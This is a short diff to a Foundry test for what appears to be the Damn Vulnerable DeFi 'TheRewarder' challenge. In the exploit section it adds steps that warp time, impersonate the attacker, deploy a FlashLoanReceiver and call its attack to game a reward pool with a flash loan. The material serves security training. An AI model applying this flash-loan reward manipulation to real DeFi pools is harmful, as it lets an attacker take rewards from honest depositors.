@@ -17,6 +17,7 @@ contract TheRewarder is Test {
     uint256 internal constant USER_DEPOSIT = 100e18;
 
     Utilities internal utils;
+    FlashLoanReceiver internal flashLoanReceiver;
     FlashLoanerPool internal flashLoanerPool;
     TheRewarderPool internal theRewarderPool;
     DamnValuableToken internal dvt;
@@ -97,6 +98,15 @@ contract TheRewarder is Test {
          * flashLoan --> deposit --> rewards --> refund
          * Test validation()
          */
+        vm.warp(block.timestamp + 5 days);
+        vm.startPrank(attacker);
+        flashLoanReceiver = new FlashLoanReceiver(
+        address(flashLoanerPool),
+        address(theRewarderPool),
+        address(dvt),
+        address(theRewarderPool.rewardToken()));
+        flashLoanReceiver.attack(TOKENS_IN_LENDER_POOL);
+        vm.stopPrank();    
         /** EXPLOIT END **/
         validation();
     }
